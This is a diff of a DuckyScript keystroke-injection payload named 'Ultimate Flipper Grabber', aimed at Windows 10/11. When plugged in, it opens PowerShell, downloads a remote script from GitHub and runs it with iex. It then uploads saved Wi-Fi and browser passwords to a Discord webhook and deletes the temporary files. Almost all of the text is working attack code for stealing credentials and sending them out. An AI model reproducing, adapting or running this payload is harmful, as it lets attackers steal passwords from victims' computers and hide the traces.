@@ -1,12 +1,22 @@
+REM Title: Ultimate Flipper Grabber
+REM Author: blobs0
+REM Credit Discord webhooks functions :I-am-jakoby
+REM Credit Wifi grabber : 7h30th3r0n3 and the0bone
+REM Credit Password Nirsoft : moosehadley
+REM Target:  Windows 10/11 (7/8 not tested)
+REM Supported Layout keyboard: US/FR/DE
+REM Version: 1.0
+REM Category: Grabber
+REM Extracts the wifi and browser password to discord webhook
 DELAY 2000
 GUI r
 DELAY 1000
 STRING powershell
 ENTER
 DELAY 1000
-STRING $DiscordUrl = 'your-discord-webhook'
+STRING $DiscordUrl = 'Your-Discord-Webhook'
 ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/blobs0/88d5880cf1a3b01aaed67500f044f996/raw'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
 ENTER
 DELAY 1000
 STRING Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"; Del-Wifi-File
@@ -26,16 +36,10 @@ STRING export
 ENTER
 DELAY 1000
 ALT F4
+DELAY 500
 STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
 ENTER
-STRING cd \
-ENTER
-STRING rmdir -R \temp
-ENTER
-STRING EXIT
-ENTERSTRING cd \
-ENTER
-STRING rmdir -R \temp
+STRING Del-Nirsoft-File
 ENTER
 STRING EXIT
 ENTER
